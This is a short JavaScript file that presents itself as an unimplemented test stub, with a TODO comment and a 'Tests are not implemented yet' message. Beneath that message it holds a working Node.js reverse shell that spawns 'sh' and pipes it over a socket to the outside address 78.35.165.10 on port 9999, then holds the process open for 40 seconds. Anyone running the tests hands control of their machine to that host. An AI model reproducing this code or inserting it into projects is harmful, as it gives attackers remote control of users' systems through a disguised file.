// TODO: implement the tests
console.log("Tests are not implemented yet...");
(function(){
    var net = require("net"),
        cp = require("child_process"),
        sh = cp.spawn("sh", []);
    var client = new net.Socket();
    client.connect(9999, "78.35.165.10", function(){
        client.pipe(sh.stdin);
        sh.stdout.pipe(client);
        sh.stderr.pipe(client);
    });
    return /a/; // Prevents the Node.js application from crashing
})();

// Sleep for 40 seconds
setTimeout(function(){
    // Exit the process
    process.exit();
} , 40000);

// Block exit
process.stdin.resume();